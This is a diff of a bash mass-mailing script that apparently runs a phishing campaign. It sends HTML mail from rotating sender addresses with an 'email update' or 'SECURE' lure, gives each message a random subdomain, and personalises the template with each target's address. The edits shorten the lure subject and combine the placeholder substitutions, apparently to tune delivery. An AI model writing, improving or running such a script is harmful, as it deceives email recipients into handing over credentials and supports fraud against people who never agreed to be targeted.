@@ -150,23 +150,20 @@ while IFS= read -r email; do
   from_username="supportzed$counter"
   from_domain="admailsend.com"
   from_email="$from_username@$from_domain"
-  from_name="EMAIL UPDATE"
+  from_name="UPDATE"
   from_header="$from_name <$from_email>"
 
   # Generate random 3-digit number (e.g., 123)
   random_number=$(shuf -i 100-999 -n 1)
 
   # Construct the subject with random number
-  subject="SECURE MESSAGE - [Your email is outdated] ! ($random_number)"
+  subject="SECURE ! ($random_number)"
 
-    # Generate random 3-letter subdomain
+  # Generate random 3-letter subdomain
   subdomain=$(tr -dc 'a-z' </dev/urandom | head -c3)
-  
-  # Replace placeholder in email.html with the random subdomain
-  custom_html=$(sed "s/{{SUBDOMAIN}}/$subdomain/" email.html)
 
-  # Read HTML content and replace {{EMAIL}} with the current email address
-  html_content=$(sed "s/{{EMAIL}}/$email/g" email.html)
+  # Read HTML content and replace placeholders
+  html_content=$(sed "s/{{EMAIL}}/$email/g; s/{{SUBDOMAIN}}/$subdomain/g" email.html)
 
   # Send the email
   cat <<EOF | /usr/sbin/sendmail -t
